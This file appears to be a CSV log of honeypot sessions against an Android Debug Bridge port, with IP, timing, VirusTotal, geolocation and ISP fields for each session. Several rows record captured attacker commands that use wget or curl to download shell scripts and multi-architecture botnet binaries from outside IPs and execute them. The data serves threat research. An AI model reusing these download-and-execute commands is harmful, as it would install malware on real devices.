session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
770a794cf15a,12.47.16.110,62068,172.25.0.2,5555,2025-03-29T05:04:18.203372Z,2025-03-29T05:09:18.384211Z,300.18,honeypot01,,"malicious, phishing, malware",-5,BR,AS396982 Google LLC,0
5116cee3de14,12.47.16.110,57982,172.25.0.2,5555,2025-03-29T05:04:28.185778Z,2025-03-29T05:09:28.201006Z,300.02,honeypot01,,"malicious, phishing, malware",-5,BR,AS396982 Google LLC,0
86843c9fd754,80.103.110.0,25398,172.25.0.2,5555,2025-03-29T05:59:14.647685Z,2025-03-29T06:04:14.664507Z,300.02,honeypot01,,malware,0,CN,AS4837 CHINA UNICOM China169 Backbone,0
b981c62e5dc1,31.200.45.162,17963,172.25.0.2,5555,2025-03-29T05:59:19.446136Z,2025-03-29T06:04:19.531277Z,300.09,honeypot01,,,0,CN,AS4134 CHINANET-BACKBONE,0
d70843b758dd,195.111.23.114,57011,172.25.0.2,5555,2025-03-29T05:59:27.398046Z,2025-03-29T06:04:27.683953Z,300.29,honeypot01,,malware,0,CN,AS4837 CHINA UNICOM China169 Backbone,0
502e74a8307f,132.202.251.38,4308,172.25.0.2,5555,2025-03-29T14:13:56.296805Z,2025-03-29T14:18:56.459601Z,300.16,honeypot01,,"malicious, malware, phishing",-2,US,AS6939 Hurricane Electric LLC,0
7bd6c3943e15,124.211.11.210,38350,172.25.0.2,5555,2025-03-29T14:44:59.658379Z,2025-03-29T14:45:45.062019Z,45.4,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,"malicious, phishing",-3,LT,AS209605 UAB Host Baltic,0
10a93a3076a1,18.18.97.248,37232,172.25.0.2,5555,2025-03-29T15:19:05.738940Z,2025-03-29T15:24:05.870645Z,300.13,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
8498919fe412,220.220.138.42,41602,172.25.0.2,5555,2025-03-29T17:51:37.215649Z,2025-03-29T17:56:37.314088Z,300.1,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
84c4dd06745d,234.226.216.222,44456,172.25.0.2,5555,2025-03-29T19:03:54.394252Z,2025-03-29T19:08:54.509704Z,300.12,honeypot01,,"malicious, malware",0,US,AS8075 Microsoft Corporation,0
417d607fcde0,108.90.123.66,64076,172.25.0.2,5555,2025-03-29T19:52:49.509127Z,2025-03-29T19:57:49.686937Z,300.18,honeypot01,,"malicious, phishing, malware",-57,US,AS396982 Google LLC,1
1ff04758d297,108.90.123.66,58928,172.25.0.2,5555,2025-03-29T19:52:59.509139Z,2025-03-29T19:57:59.703132Z,300.19,honeypot01,,"malicious, phishing, malware",-57,US,AS396982 Google LLC,1
94768c3736e0,81.139.44.74,47278,172.25.0.2,5555,2025-03-30T01:21:00.785945Z,2025-03-30T01:26:00.863056Z,300.08,honeypot01,,"malicious, phishing, malware",-1,US,"AS14061 DigitalOcean, LLC",0
6ae08ed426dd,109.161.116.191,43142,172.25.0.2,5555,2025-03-30T02:03:23.020535Z,2025-03-30T02:08:23.107964Z,300.09,honeypot01,,"malicious, phishing, malware",-2,CA,"AS14061 DigitalOcean, LLC",0
c5d888440289,6.251.21.12,64022,192.168.0.2,5555,2025-03-28T04:18:29.428963Z,2025-03-28T04:23:29.490018Z,300.06,honeypot01,,"malicious, phishing, malware",-1,BE,AS396982 Google LLC,0
4f321bd44431,6.251.21.12,64162,192.168.0.2,5555,2025-03-28T04:18:39.429821Z,2025-03-28T04:23:39.506721Z,300.08,honeypot01,,"malicious, phishing, malware",-1,BE,AS396982 Google LLC,0
8b4cdb0e3e6a,69.84.251.67,39954,192.168.0.2,5555,2025-03-28T04:40:23.621049Z,2025-03-28T04:41:10.277720Z,46.66,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/adb.sh -O- | sh,"malware, phishing, malicious",-2,NO,"AS200195 Verasel, Inc.",0
25a7d0f43428,27.24.177.228,19040,192.168.0.2,5555,2025-03-28T08:40:59.450501Z,2025-03-28T08:45:59.467236Z,300.02,honeypot01,,"malicious, malware, phishing",-12,US,AS6939 Hurricane Electric LLC,0
39980fd8debd,124.211.11.210,54646,192.168.0.2,5555,2025-03-28T10:41:25.111509Z,2025-03-28T10:42:11.065748Z,45.95,honeypot01,cd /data/local/tmp/; busybox wget http://193.32.162.27/w.sh; sh w.sh; curl http://193.32.162.27/c.sh; sh c.sh,"malicious, phishing",-3,LT,AS209605 UAB Host Baltic,0
3e49ba8ec753,152.60.107.245,35885,192.168.0.2,5555,2025-03-28T11:22:09.559177Z,2025-03-28T11:27:09.683119Z,300.12,honeypot01,,"malicious, malware",-1,FR,AS213412 ONYPHE SAS,0
e73d81d66343,152.60.107.156,43007,192.168.0.2,5555,2025-03-28T11:22:10.326420Z,2025-03-28T11:27:11.286639Z,300.96,honeypot01,,"malicious, malware",-1,FR,AS213412 ONYPHE SAS,0
2a99ef3ef472,18.18.97.248,34526,192.168.0.2,5555,2025-03-28T15:03:28.649631Z,2025-03-28T15:08:28.880698Z,300.23,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
8f934b3315e2,133.94.237.66,17098,192.168.0.2,5555,2025-03-28T16:28:38.184781Z,2025-03-28T16:33:38.449404Z,300.26,honeypot01,,"malicious, phishing, malware",-54,US,AS6939 Hurricane Electric LLC,1
1cb614935ef1,91.216.17.102,49532,192.168.0.2,5555,2025-03-28T21:32:02.647950Z,2025-03-28T21:37:02.803467Z,300.16,honeypot01,,,0,VN,AS45899 VNPT Corp,0
8500d8aeaecc,91.216.17.102,55088,192.168.0.2,5555,2025-03-28T21:32:07.653040Z,2025-03-28T21:37:07.670133Z,300.02,honeypot01,,,0,VN,AS45899 VNPT Corp,0
64790e3e78b3,5.59.94.214,52648,192.168.0.2,5555,2025-03-28T21:58:58.652124Z,2025-03-28T22:03:58.688826Z,300.04,honeypot01,,"malware, malicious",0,NL,AS401120 cheapy.host LLC,0
a1d3ea8838a4,253.75.211.211,52052,192.168.0.2,5555,2025-03-28T23:53:29.595545Z,2025-03-28T23:58:29.674119Z,300.08,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
406a10c8c946,69.244.67.13,47751,192.168.0.2,5555,2025-03-29T00:37:08.203849Z,2025-03-29T00:42:08.447199Z,300.24,honeypot01,,"malicious, malware, phishing",0,US,AS21859 Zenlayer Inc,0
38315ffca895,76.69.240.77,47414,172.18.0.2,5555,2025-03-19T11:22:52.705290Z,2025-03-19T11:27:52.903437Z,300.2,honeypot01,,"malicious, malware",0,DE,,0
869d7ee7ef3b,18.18.97.65,34238,172.18.0.2,5555,2025-03-19T12:33:12.782463Z,2025-03-19T12:38:12.927204Z,300.14,honeypot01,,"malware, phishing, malicious",0,NL,AS214943 Railnet LLC,0
8c575690f02c,108.87.230.201,37748,172.18.0.2,5555,2025-03-19T19:17:21.531983Z,2025-03-19T19:22:21.716213Z,300.18,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
f7a13c7361f7,108.87.230.201,60360,172.18.0.2,5555,2025-03-19T19:17:31.449525Z,2025-03-19T19:22:31.559357Z,300.11,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
5d2fffed00b5,108.87.230.201,45936,172.18.0.2,5555,2025-03-19T19:17:41.452727Z,2025-03-19T19:22:41.571308Z,300.12,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
1228150b4e34,108.87.230.201,53778,172.18.0.2,5555,2025-03-19T19:17:51.454022Z,2025-03-19T19:22:51.589824Z,300.14,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
2ce4e0369e14,108.87.230.201,58882,172.18.0.2,5555,2025-03-19T19:18:01.453270Z,2025-03-19T19:23:01.590711Z,300.14,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
5aaa01b0d712,108.87.230.201,39344,172.18.0.2,5555,2025-03-19T19:18:11.450963Z,2025-03-19T19:23:11.584290Z,300.13,honeypot01,,"malicious, malware, phishing",-2,CA,"AS14061 DigitalOcean, LLC",0
133230b0dcf3,68.185.216.31,22870,172.18.0.2,5555,2025-03-20T00:37:07.060918Z,2025-03-20T00:42:07.077416Z,300.02,honeypot01,,"malicious, phishing, malware",-18,US,AS6939 Hurricane Electric LLC,0
3670a0306bc5,5.59.92.75,35422,172.18.0.2,5555,2025-03-20T03:24:01.581614Z,2025-03-20T03:24:47.052485Z,45.47,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
c62fdf504680,133.94.131.94,64102,192.168.96.2,5555,2025-03-18T05:29:36.800572Z,2025-03-18T05:34:37.047185Z,300.25,honeypot01,,"malicious, phishing, malware",-31,US,AS6939 Hurricane Electric LLC,0
4ae818b74c8c,76.69.240.77,52256,192.168.96.2,5555,2025-03-18T05:59:44.153095Z,2025-03-18T06:04:44.388587Z,300.24,honeypot01,,"malicious, malware",0,DE,,0
4fa5fb29a74b,132.202.251.184,43383,192.168.96.2,5555,2025-03-18T07:47:23.736289Z,2025-03-18T07:52:23.920425Z,300.18,honeypot01,,"malicious, malware",-2,US,AS6939 Hurricane Electric LLC,0
56e75997a4b2,12.47.16.1,59020,192.168.96.2,5555,2025-03-18T08:10:09.313849Z,2025-03-18T08:15:09.396036Z,300.08,honeypot01,,"malicious, phishing, malware",-5,BR,AS396982 Google LLC,0
15cb85fe5bf5,12.47.16.1,60970,192.168.96.2,5555,2025-03-18T08:10:19.315478Z,2025-03-18T08:15:19.409791Z,300.09,honeypot01,,"malicious, phishing, malware",-5,BR,AS396982 Google LLC,0
ad7c5bb316d3,98.10.133.31,41308,192.168.96.2,5555,2025-03-18T10:14:53.181821Z,2025-03-18T10:19:53.184300Z,300.0,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
40e957fe5588,98.10.133.31,37332,192.168.96.2,5555,2025-03-18T10:15:03.182122Z,2025-03-18T10:20:03.189210Z,300.01,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
db235fc526b9,98.10.133.31,48446,192.168.96.2,5555,2025-03-18T10:15:13.183381Z,2025-03-18T10:20:13.199959Z,300.02,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
f85741521e9a,98.10.133.31,48810,192.168.96.2,5555,2025-03-18T10:15:23.182061Z,2025-03-18T10:20:23.201227Z,300.02,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
ceb754b1775e,98.10.133.31,54312,192.168.96.2,5555,2025-03-18T10:15:33.175821Z,2025-03-18T10:20:33.371144Z,300.2,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
5c2b334b4675,98.10.133.31,42476,192.168.96.2,5555,2025-03-18T10:15:43.184732Z,2025-03-18T10:20:43.189127Z,300.0,honeypot01,,"malicious, phishing, malware",-1,NL,"AS14061 DigitalOcean, LLC",0
10d861759097,213.227.118.40,22211,192.168.96.2,5555,2025-03-18T12:46:53.925902Z,2025-03-18T12:51:53.988137Z,300.06,honeypot01,,malware,0,CN,AS4134 CHINANET-BACKBONE,0
734bbc3a9948,194.211.90.174,51977,192.168.96.2,5555,2025-03-18T12:47:01.948994Z,2025-03-18T12:52:02.105816Z,300.16,honeypot01,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,0
2c71c6df6ffb,195.111.0.191,52412,192.168.96.2,5555,2025-03-18T12:47:09.925372Z,2025-03-18T12:52:10.100189Z,300.17,honeypot01,,,0,CN,AS4837 CHINA UNICOM China169 Backbone,0
3455ba9c4b70,144.154.157.90,42498,192.168.96.2,5555,2025-03-18T15:14:20.433265Z,2025-03-18T15:15:06.056932Z,45.62,honeypot01,cd /data/local/tmp/; busybox wget http://94.142.130.241/w.sh; sh w.sh; curl http://94.142.130.241/c.sh; sh c.sh,"phishing, malicious, malware",-1,NL,AS215925 VPSVAULT.HOST LTD,0
346c18309205,106.54.110.246,49212,192.168.96.2,5555,2025-03-18T19:17:32.339507Z,2025-03-18T19:22:32.652461Z,300.31,honeypot01,,malicious,-1,CA,AS16276 OVH SAS,0
e7c77a6f18fb,76.69.240.77,46856,192.168.96.2,5555,2025-03-18T19:22:06.431455Z,2025-03-18T19:27:06.637766Z,300.21,honeypot01,,"malicious, malware",0,DE,,0
f7a240ac52d0,132.202.251.115,39365,192.168.96.2,5555,2025-03-19T02:57:15.298863Z,2025-03-19T03:02:15.481919Z,300.18,honeypot01,,"malicious, malware, phishing",-4,US,AS6939 Hurricane Electric LLC,0
02fd59976590,12.47.16.52,58424,172.29.0.2,5555,2025-03-17T08:45:21.518457Z,2025-03-17T08:50:21.645811Z,300.13,honeypot01,,"malicious, phishing, malware",-54,BR,AS396982 Google LLC,1
55ebc19df2ab,12.47.16.52,62332,172.29.0.2,5555,2025-03-17T08:45:31.520265Z,2025-03-17T08:50:31.658558Z,300.14,honeypot01,,"malicious, phishing, malware",-54,BR,AS396982 Google LLC,1
abb3d282406f,234.70.169.228,41566,172.29.0.2,5555,2025-03-17T10:15:40.276659Z,2025-03-17T10:20:40.294151Z,300.02,honeypot01,,malicious,0,US,AS8075 Microsoft Corporation,0
14857d973a07,133.94.131.208,41171,172.29.0.2,5555,2025-03-17T11:26:42.999480Z,2025-03-17T11:31:43.173690Z,300.17,honeypot01,,"malicious, malware, phishing",-2,US,AS6939 Hurricane Electric LLC,0
b79dd25b5bb1,76.69.240.77,51736,172.29.0.2,5555,2025-03-17T14:42:03.260382Z,2025-03-17T14:47:03.495735Z,300.24,honeypot01,,"malicious, malware",0,DE,,0
34c48bdc3d74,208.39.4.148,19564,172.29.0.2,5555,2025-03-17T15:22:06.220216Z,2025-03-17T15:22:09.470670Z,3.25,honeypot01,,"malicious, malware",-2,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
7b84f86cfcf7,208.39.4.148,34870,172.29.0.2,5555,2025-03-17T15:22:19.720282Z,2025-03-17T15:22:22.732223Z,3.01,honeypot01,,"malicious, malware",-2,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
7fe16232f891,208.39.4.148,40774,172.29.0.2,5555,2025-03-17T15:22:32.984264Z,2025-03-17T15:22:35.985364Z,3.0,honeypot01,,"malicious, malware",-2,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
a786c0f0747e,208.39.4.148,30210,172.29.0.2,5555,2025-03-17T15:22:46.224000Z,2025-03-17T15:22:49.224556Z,3.0,honeypot01,,"malicious, malware",-2,MY,"AS45102 Alibaba (US) Technology Co., Ltd.",0
056a482ff212,109.161.214.54,38136,172.29.0.2,5555,2025-03-17T18:24:28.468704Z,2025-03-17T18:29:28.647809Z,300.18,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
